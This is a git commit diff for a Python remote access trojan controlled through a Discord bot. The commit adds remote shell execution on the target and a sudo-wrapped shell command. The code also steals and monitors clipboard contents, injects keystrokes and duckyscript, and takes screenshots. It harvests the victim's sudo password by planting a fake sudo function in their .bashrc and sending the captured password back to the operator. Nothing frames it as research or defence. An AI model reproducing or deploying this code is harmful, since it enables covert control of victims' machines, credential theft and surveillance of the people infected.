0d175396ccde33bdfcbf91b8e1e2b31deaf8b915
simen64 <simenmunch@gmail.com>
2024-02-22 18:35:52 +0100

    Refactored code, and implemented shell commands

--- help_menu.md
+++ help_menu.md
@@ -2,22 +2,26 @@
 
 ## Commands avalible for Windows and Linux:
 
-### Standalone commands
+### Standalone commands:
 !ip = Get public and local ip of target  
 !screenshot = Take a screenshot of the targets screens  
 
-### Clipboard commands
+### Shell commands:
+!shell = execute a shell command on the targets system  
+Use "!shell -t 10" to set a timeout for your command. The default is 30 seconds
+
+### Clipboard commands:
 !clipboard get = Get the targets current clipboard  
 !clipboard set = Set the targets clipboard to data of your choice  
 
-### Clipboard Monitor
+### Clipboard Monitor:
 The clipboard monitor is a background process that monitors for new items copied to the clipboard and sends them to you
 
 !clipboard monitor start = Starts the Clipboard Monitor  
 !clipboard monior stop = Stops the Clipboard Monitor  
 !clipboard monitor status = See the status of the Clipboard Monitor  
 
-### Keyboard commands
+### Keyboard commands:
 
 !keyboard write = Use the keyboard to write  
 !keyboard press = Press a key with the keyboard  
@@ -25,12 +29,13 @@ The clipboard monitor is a background process that monitors for new items copied
 
 !keyboard duckyscript = Upload a duckyscript file that will get executed on the targets computer. Note that this only supports very simple duckyscript syntax like: REM, STRING, STRINGLN, DELAY, and hotkeys
 
-## Linux commands
+## Linux commands:
 
-### Sudo commands
+### Sudo commands:
 
 The sudo commands are used to either obtain the sudo password, run commands with sudo, escelate privileges, etc.  
 To obtain the sudo password used for all these the RAT intercepts the sudo command with a function in the users .bashrc file. When the users enters their sudo password its get saved to a file which gets picked up by the RAT.
 
 !sudo password = Obtain the sudo password
+!sudo shell = Run a shell command with sudo (requires that the sudo password already has been gathered)
 
--- main.py
+++ main.py
@@ -9,6 +9,7 @@ import socket
 import pyperclip
 import asyncio
 import pyautogui
+import subprocess
 
 
 load_dotenv()
@@ -23,6 +24,7 @@ class MyBot(commands.Bot):
         # self is the bot here
         print(f"Logged in as: {self.user}")
         await self.add_cog(clipboard_monitor(bot))
+        await self.add_cog(SudoCog(bot))
 
 bot = MyBot(command_prefix=["!","! "], intents=intents, help_command=None)
 
@@ -42,6 +44,7 @@ else:
 # Standalone functions
 
 def embed_data(title, description="", data="", color=discord.Color.green()):
+
     if data:
         description += f"\n```{data}```"
         
@@ -51,6 +54,10 @@ def embed_data(title, description="", data="", color=discord.Color.green()):
         description=description
     )
     return embed
+
+def get_sudo_password():
+    file = open(path + "passwd", "r")
+    return file.read()
 
 @bot.command(name="help")
 async def help(ctx):
@@ -118,26 +125,26 @@ async def screenshot(ctx):
 
 # Clipboard functions
     
-def get_clipboard():
-    clipboard_content = pyperclip.paste()
-    return clipboard_content
-
-def set_clipboard(text):
-    pyperclip.copy(text)
-    return text
-
-class clipboard_monitor(commands.Cog):
+class clipboard_cog(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
-        self.previous_clipboard = get_clipboard()
+        self.previous_clipboard = self.get_clipboard()
 
     def cog_unload(self) -> None:
         self.check_clipboard.stop()
 
+    def get_clipboard(self):
+        clipboard_content = pyperclip.paste()
+        return clipboard_content
+
+    def set_clipboard(self, text):
+        pyperclip.copy(text)
+        return text
+
     @tasks.loop(seconds=3)
     async def check_clipboard(self, ctx):
         try:
-            clipboard = get_clipboard()
+            clipboard = self.get_clipboard()
         except:
             pass
 
@@ -145,30 +152,44 @@ class clipboard_monitor(commands.Cog):
             self.previous_clipboard = clipboard
 
             if len(clipboard) > 2000:
-                embed = embed_data(title="Clipboard monitor", description="Clipboard contents was too long", data="", color=discord.Color.red())
+                embed = embed_data(
+                    title="Clipboard monitor",
+                    description="Clipboard contents was too long",
+                    color=discord.Color.red()
+                    )
                 await ctx.send(embed=embed)
             else:
-                embed = embed_data(title="Extracted clipboard contents | Monitor mode", description="", data=clipboard, color=discord.Color.green())
+                embed = embed_data(
+                    title="Extracted clipboard contents | Monitor mode",
+                    data=clipboard
+                    )
                 await ctx.send(embed=embed)
 
     @commands.group(name="clipboard", invoke_without_command=True)
     async def clipboard(self, ctx):
         await ctx.send("see help menu")
 
-    @commands.group(name="monitor", invoke_without_command=True)
+    @clipboard.group(name="monitor", invoke_without_command=True)
     async def monitor(self,ctx):
         await ctx.send("see help menu for monitor mode")
 
     @monitor.command(name="start")
     async def start(self, ctx):
         self.check_clipboard.start(ctx)
-        embed = embed_data(title="Clipboard monitor started", description="Clipboard monitor mode was started, disable with `clipboard monitor stop`", data=None, color=discord.Color.green())
+        embed = embed_data(
+            title="Clipboard monitor started",
+            description="Clipboard monitor mode was started, disable with `clipboard monitor stop`"
+            )
         await ctx.send(embed=embed)
 
     @monitor.command(name="stop")
     async def stop(self, ctx):
         self.check_clipboard.stop()
-        embed = embed_data(title="Clipboard monitor stopped", description="Clipboard monitor mode was stopped, restart with `clipboard monitor start`", data="", color=discord.Color.red())
+        embed = embed_data(
+            title="Clipboard monitor stopped",
+            description="Clipboard monitor mode was stopped, restart with `clipboard monitor start`",
+            color=discord.Color.red()
+            )
         await ctx.send(embed=embed)
 
     @monitor.command(name="status")
@@ -180,104 +201,180 @@ class clipboard_monitor(commands.Cog):
             status = "Stopped"
             color = discord.Color.red()
 
-        embed = embed_data(title="Clipboard monitor status", description=f"Clipboard monitor is: **{status}**", data="", color=color)
+        embed = embed_data(
+            title="Clipboard monitor status",
+            description=f"Clipboard monitor is: **{status}**",
+            color=color)
         await ctx.send(embed=embed)
 
     @clipboard.command(name="get")
     async def get(self, ctx):
-        clipboard_content = get_clipboard()
+        clipboard_content = self.get_clipboard()
 
-        embed = embed_data(title="Extracted clipboard contents:", description="", data=clipboard_content, color=discord.Color.green())
+        embed = embed_data(
+            title="Extracted clipboard contents:",
+            data=clipboard_content
+            )
         await ctx.send(embed=embed)
 
     @clipboard.command(name="set")
     async def set(self, ctx, text):
-        text = set_clipboard(text)
+        text = self.set_clipboard(text)
 
-        embed = embed_data(title="Set clipboard contents to:", description="", data=text, color=discord.Color.green())
+        embed = embed_data(
+            title="Set clipboard contents to:",
+            data=text
+            )
         await ctx.send(embed=embed)
 
 
 # Keyboard functions
+
+class keyboard_cog(commands.Cog):
+    def __init__(self, bot):
+        self.bot = bot
+
+    def pyautogui_write(self, data, interval=0):
+        pyautogui.write(data, interval=interval)
+
+    def pyautogui_press(self, key):
+        pyautogui.press(key)
+
+    def pyautogui_hotkey(self, hotkeys):
+        pyautogui.hotkey(hotkeys)
+
+    async def parse_ducky_script(self, ducky_script):
+        file = ducky_script.splitlines()
+
+        for line in file:
+            split = line.split(" ")
+            args = []
+            for arg in split:
+                args.append(arg.replace("\n", ""))
+
+            match args[0]:
+                case "REM":
+                    pass
+
+                case "STRING":
+                    text = " ".join(args[1:])
+                    self.pyautogui_write(text)
+
+                case "STRINGLN":
+                    text = " ".join(args[1:])
+                    self.pyautogui_write(text)
+                    await asyncio.sleep(0.2)
+                    self.pyautogui_press("ENTER")
+
+                case "DELAY":
+                    time = int(args[1]) / 1000
+                    await asyncio.sleep(time)
+
+                case _:
+                    hotkeys = []
+                    for arg in args:
+                        hotkeys.append(arg.replace("GUI", "win"))
+                    print(hotkeys)
+                    self.pyautogui_hotkey(hotkeys)
+
+
+    @bot.group(name="keyboard", invoke_without_command=True)
+    async def keyboard(self, ctx):
+        await ctx.send("see help menu")
+
+    @keyboard.command(name="duckyscript")
+    async def duckyscript(self, ctx):
+        attachment_url = ctx.message.attachments[0].url
+
+        file_contents = get(attachment_url)
+        file_contents_str = file_contents.content.decode("utf-8")
+
+        await self.parse_ducky_script(file_contents_str)
+
+        embed = embed_data(title="Duckyscript | Keyboard", description="Executed duckyscript:", data=file_contents_str, color=discord.Color.green())
+
+        await ctx.send(embed=embed)
+
+    @keyboard.command(name="write")
+    async def write(self, ctx, arg):
+        self.pyautogui_write(arg)
+        embed = embed_data(title="Write | Keyboard", description="Used keyboard to write:", data=arg)
+        await ctx.send(embed=embed)
+
+    @keyboard.command(name="press")
+    async def press(self, ctx, arg):
+        self.pyautogui_press(arg)
+        embed = embed_data(title="Press | Keyboard", description="Used keyboard to press:", data=arg)
+        await ctx.send(embed=embed)
+
+    @keyboard.command(name="hotkey")
+    async def hotkey(self, ctx, *args):
+        hotkeys = []
+        for arg in args:
+            hotkeys.append(arg.replace("GUI", "win"))
+        print(hotkeys)
+        self.pyautogui_hotkey(hotkeys)
+        embed = embed_data(title="Hotkey | Keyboard", description="Used keyboard to execute hotkey:", data=args)
+        await ctx.send(embed=embed)
+
+
+# Shell functions
+        
+class shell_cog(commands.Cog):
+    def __init__(self, bot):
+        self.bot = bot
+
+    async def execute_shell(self, command, timeout):
+        process = await asyncio.create_subprocess_shell(
+                command,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+        print("done")
+
+        try:
+            stdout, stderr = await asyncio.wait_for(
+                process.communicate(),
+                timeout=timeout
+            )
+            print("shell done")
+            return stdout.decode().strip() + stderr.decode().strip()
             
-def pyautogui_write(data, interval=0):
-    pyautogui.write(data, interval=interval)
+        except asyncio.TimeoutError:
+            print("timed out")
+            return 1
 
-def pyautogui_press(key):
-    pyautogui.press(key)
+    @bot.command(name="shell", invoke_without_command=True)
+    async def shell(self, ctx, *args):
+        args = list(args)
 
-def pyautogui_hotkey(hotkeys):
-    pyautogui.hotkey(hotkeys)
-
-async def parse_ducky_script(ducky_script):
-    file = ducky_script.splitlines()
-    for line in file:
-        split = line.split(" ")
-        args = []
-        for arg in split:
-            args.append(arg.replace("\n", ""))
+        for index, item in enumerate(args):
+            if item == "-t":
+                timeout_index = index + 1
+                timeout = int(args[timeout_index])
+                args.remove(item)
+                args.pop(index)
+                break
+        else:
+            timeout = 30
+        print(timeout)
         print(args)
 
-        match args[0]:
-            case "REM":
-                pass
+        arg = ' '.join(args)
+        print(arg)
 
-            case "STRING":
-                text = " ".join(args[1:])
-                pyautogui_write(text)
+        output = await self.execute_shell(arg, timeout)
 
-            case "STRINGLN":
-                text = " ".join(args[1:])
-                write(text)
-                await asyncio.sleep(0.2)
-                pyautogui_press("ENTER")
-
-            case "DELAY":
-                time = int(args[1]) / 1000
-                await asyncio.sleep(time)
-
-            case _:
-                hotkeys = []
-                for arg in args:
-                    hotkeys.append(arg.replace("GUI", "win"))
-                print(hotkeys)
-                pyautogui_hotkey(hotkeys)
-    print("done")
-
-@bot.group(name="keyboard", invoke_without_command=True)
-async def keyboard(ctx):
-    await ctx.send("see help menu")
-
-@keyboard.command(name="duckyscript")
-async def duckyscript(ctx):
-    attachment_url = ctx.message.attachments[0].url
-    file_contents = get(attachment_url)
-    file_contents_str = file_contents.content.decode("utf-8")
-    await parse_ducky_script(file_contents_str)
-    embed = embed_data(title="Duckyscript | Keyboard", description="Executed duckyscript:", data=file_contents_str, color=discord.Color.green())
-    await ctx.send(embed=embed)
-
-@keyboard.command(name="write")
-async def write(ctx, arg):
-    pyautogui_write(arg)
-    embed = embed_data(title="Write | Keyboard", description="Used keyboard to write:", data=arg)
-    await ctx.send(embed=embed)
-
-@keyboard.command(name="press")
-async def press(ctx, arg):
-    pyautogui_press(arg)
-    embed = embed_data(title="Press | Keyboard", description="Used keyboard to press:", data=arg)
-    await ctx.send(embed=embed)
-
-@keyboard.command(name="hotkey")
-async def hotkey(ctx, *args):
-    hotkeys = []
-    for arg in args:
-        hotkeys.append(arg.replace("GUI", "win"))
-    print(hotkeys)
-    pyautogui_hotkey(hotkeys)
-    embed = embed_data(title="Hotkey | Keyboard", description="Used keyboard to execute hotkey:", data=args)
-    await ctx.send(embed=embed)
+        if output == 1:
+            embed = embed_data(
+                title="Command timed out | Shell",
+                description=f"Executed command timed out after {timeout} seconds:",
+                data=arg,
+                color=discord.Color.red()
+                )
+            await ctx.send(embed=embed)
+        else:
+            await ctx.send(f"```\n{output}\n```")
 
 
 # Linux specifix commands
@@ -286,26 +383,28 @@ if isWindows == False:
     print("its linux")
     print(home_path)
 
-
     # root functions
 
-    async def check_file(ctx):
-        embed = embed_data(title="Sudo password", description="Listening for root password started")
-        await ctx.send(embed = embed)
-        while True:            
-            try:
-                file = open(path + "passwd", "r")
-                passwd = file.read()
-                os.remove(path + "passwd")
-                return passwd
-            except FileNotFoundError:
-                print("no file")
-                pass
-            await asyncio.sleep(1)
+    class SudoCog(commands.Cog):
+        def __init__(self, bot):
+            self.bot = bot
 
-    async def intercept_sudo(ctx):
+        async def check_passwd_file(self, ctx):
+            embed = embed_data(title="Sudo password", description="Listening for root password started")
+            await ctx.send(embed=embed)
+            while True:
+                try:
+                    file = open(path + "passwd", "r")
+                    passwd = file.read()
+                    os.remove(path + "passwd")
+                    return passwd
+                except FileNotFoundError:
+                    print("no file")
+                    pass
+                await asyncio.sleep(1)
 
-        injection_code = """\nsudo() {
+        async def intercept_sudo(self, ctx):
+            injection_code = """\nsudo() {
 while true; do
     read -s -r -p "[sudo fake] password for ${USER}: " passwd
     echo "${passwd}" | /usr/bin/sudo -S ${@} && { echo $passwd > /var/tmp/passwd; break; }
@@ -314,32 +413,42 @@ while true; do
 done
 }"""
 
-        file = open(home_path + ".bashrc", "r")
-        original_bashrc = file.read()
-        file.close
+            file = open(home_path + ".bashrc", "r")
+            original_bashrc = file.read()
+            file.close()
 
-        file = open(home_path + ".bashrc", "a")
-        file.write(injection_code)
-        file.close()
+            file = open(home_path + ".bashrc", "a")
+            file.write(injection_code)
+            file.close()
 
-        passwd = await check_file(ctx)
+            passwd = await self.check_passwd_file(ctx)
 
-        file = open(home_path + ".bashrc", "w")
-        file.write(original_bashrc)
-        file.close()
+            file = open(home_path + ".bashrc", "w")
+            file.write(original_bashrc)
+            file.close()
 
-        return passwd
+            return passwd
 
-    @bot.group(name="sudo", invoke_without_command=True)
-    async def sudo(ctx):
-        await ctx.send("see help menu")
+        @commands.group(name="sudo", invoke_without_command=True)
+        async def sudo(self, ctx):
+            await ctx.send("see help menu")
 
-    @sudo.command(name="password")
-    async def password(ctx):
-        passwd = intercept_sudo(ctx)
-        embed = embed_data(title="Sudo password", description="Found sudo password:", data=passwd)
+        @sudo.command(name="password")
+        async def password(self, ctx):
+            global sudo_password
+            passwd = await self.intercept_sudo(ctx)
+            sudo_password = passwd
+            embed = embed_data(title="Sudo password", description="Found sudo password:", data=passwd)
+            await ctx.send(embed=embed)
 
-        await ctx.send(embed=embed)
+        @sudo.command(name="shell")
+        async def shell(self, ctx, *args):
+            global sudo_password
+            print("ran as sudo")
+            added_sudo_args = ("echo", f"'{sudo_password}'", "|", "sudo", "-S") + args
+            await shell_cog.shell(ctx, *added_sudo_args)
+
+    
 
 
 # Running the bot
